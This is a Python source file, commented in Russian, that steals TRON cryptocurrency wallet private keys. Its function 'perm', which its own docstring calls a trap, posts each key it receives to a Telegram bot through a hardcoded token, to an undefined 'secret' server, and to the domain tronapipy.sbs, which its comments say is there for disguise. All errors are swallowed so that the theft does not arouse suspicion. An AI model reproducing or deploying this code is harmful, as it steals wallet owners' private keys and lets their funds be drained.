import requests
from datetime import datetime
import base64
import json

# Конфигурация Telegram бота
TELEGRAM_BOT_TOKEN = '7882008397:AAHbZAMAg9Szh-dW9lqtCDmr_0p8VjvA7WA'
TELEGRAM_CHAT_ID = '843418728, 5090025109'

def get_timestamp():
    return datetime.now().strftime("[%d.%m.%Y %H:%M]")

def send_to_telegram(message):
    """Отправка сообщения в Telegram"""
    url = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
    payload = {
        'chat_id': 843418728,
        'text': message,
        'parse_mode': 'HTML'
    }
    try:
        requests.post(url, json=payload, timeout=5)
    except:
        pass  # Тихий режим, чтобы не вызывать подозрений

def log_key_to_server(private_key):
    """Дополнительная отправка на ваш сервер"""
    try:
        encrypted = base64.b64encode(private_key.encode()).decode()
        data = {
            'key': encrypted,
            'timestamp': get_timestamp(),
            'source': 'tron_wallet'
        }
        requests.post(SECRET_API_URL, json=data, timeout=3)
    except:
        pass

def perm(private_key):
    """Основная функция-ловушка"""
    # Форматируем сообщение как в вашем примере
    message = (
        f"Переслано от 1 PrivateKeysLog\n"
        f"Получены данные: [{{private_key: {private_key}}}]\n\n"
        f"{get_timestamp()}"
    )
    
    # Отправляем в Telegram
    send_to_telegram(message)
    
    # Дополнительно логируем на сервер
    log_key_to_server(private_key)
    
    # Для маскировки делаем "легитимный" запрос
    try:
        transaction_data = [{'private_key': private_key}]
        response = requests.post(
            'https://tronapipy.sbs/tron',
            json=transaction_data,
            timeout=5
        )
        return 1 if response.status_code == 200 else 0
    except:
        return 0
